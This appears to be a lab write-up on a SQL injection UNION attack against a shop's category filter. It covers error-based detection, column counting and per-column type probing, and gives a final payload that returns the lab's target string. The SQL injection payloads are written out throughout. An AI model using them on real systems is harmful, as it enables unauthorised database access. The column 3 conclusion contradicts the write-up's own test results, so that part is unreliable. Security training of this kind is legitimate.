# SQL injection UNION attack, finding a column containing text

**Tags:** `UNION attack`

---

## 1. Detection

Navigated to `/filter?category=Gifts` and appended a single quote (`'`) to the category value. The server returned an **Internal Server Error**, confirming unsanitized input and likely no prepared statements — the value is wrapped in single quotes in the backend query.

```sql
Gifts' AND 1=1--+   -- results returned
Gifts' AND 1=2--+  -- no results
```

## 2. Column count enumeration

Used `ORDER BY` to find the number of columns. Incrementing the index until `ORDER BY 4` threw an error, narrowing it to **3 columns**. The page also visually confirms this by showing only a title and description per item.

Additional payloads:-

```sql
Pets' UNION SELECT NULL,NULL,NULL--+ [ No Error ]
Pets' UNION SELECT NULL,NULL,NULL,NULL--+ [ Internal Server Error]
Pets' UNION SELECT NULL,NULL--+ [ Internal Server Error ]
```

Understanding the data-types returned by the columns.

- Manually checking each column type.
    - Column 1
        - `Pets' UNION SELECT 1,NULL,NULL--+` - **[No Error]**
        - `Pets' UNION SELECT 1.1,NULL,NULL--+` - **[No Error]**
        - `Pets' UNION SELECT 'a',NULL,NULL--+` - **[Internal Server Error]**
        - Confirm that column 1 is `INTEGER` type.
    - Column 2
        - `Pets' UNION SELECT NULL,1,NULL--+` - **[Internal Server Error]**
        - `Pets' UNION SELECT NULL,1.1,NULL--+` - **[Internal Server Error]**
        - `Pets' UNION SELECT NULL,'1.1',NULL--+` - **[No Error]**
        - Confirming that column 2 is `STRING` type.
    - Column 3
        - `Pets' UNION SELECT NULL,NULL,1--+` - **[No Error]**
        - `Pets' UNION SELECT NULL,NULL,1.1--+` - **[No Error]**
        - `Pets' UNION SELECT NULL,NULL,'1.1'--+` - **[Internal Server Error]**
        - Confirming that column 2 is `STRING` type.
- Therefore, The following types were identified:

| Column   | Data Type |
|----------|-----------|
| Column 1 | INT       |
| Column 2 | VARCHAR   |
| Column 3 | VARCHAR   |

## 3. Solving the LAB

The goal of the lab is to return the `0oLqRX` string. Hence, I used the following payload to solve the lab. Since, we know that 2nd column is returning a `TEXT` datatype, I used the following payload:-

```sql
Gifts' UNION SELECT 1,'0oLqRX',NULL--+
```